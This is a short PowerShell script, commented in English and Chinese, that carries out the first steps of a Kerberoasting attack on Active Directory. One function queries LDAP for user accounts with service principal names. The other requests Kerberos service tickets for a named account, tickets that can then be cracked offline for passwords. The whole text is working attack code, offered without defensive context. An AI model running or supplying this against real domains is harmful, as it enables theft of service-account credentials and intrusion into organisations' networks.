function Frail-Spns{
	# Build LDAP Filter to look for users with SPN values registered for current domain
	# 构建LDAP筛选器以查找具有为当前域注册的SPN值的用户
	$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
	$domain = New-Object System.DirectoryServices.DirectoryEntry
	$search = New-Object System.DirectoryServices.DirectorySearcher
	$search.SearchRoot = $domain
	$search.PageSize = 1000
	$search.Filter = $ldapFilter
	$search.SearchScope = "Subtree"

	# Execute Search
	#执行搜索操作
	$results = $search.FindAll()

	# Display SPN values from the returned objects
	# 遍历SPN的值从对象中并显示
	$Results = foreach ($result in $results){
		$result_entry = $result.GetDirectoryEntry()
		$result_entry | Select-Object @{
			Name = "Username";  Expression = { $_.sAMAccountName }
		}, @{
			Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }
		}
	}
	echo $Results
}

function Inject-Ticket{
	Param(
		[Parameter(Mandatory=$true)]
		[String]$ServiceAccount
	)
	Add-Type -AssemblyName System.IdentityModel
	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$ServiceAccount"
}
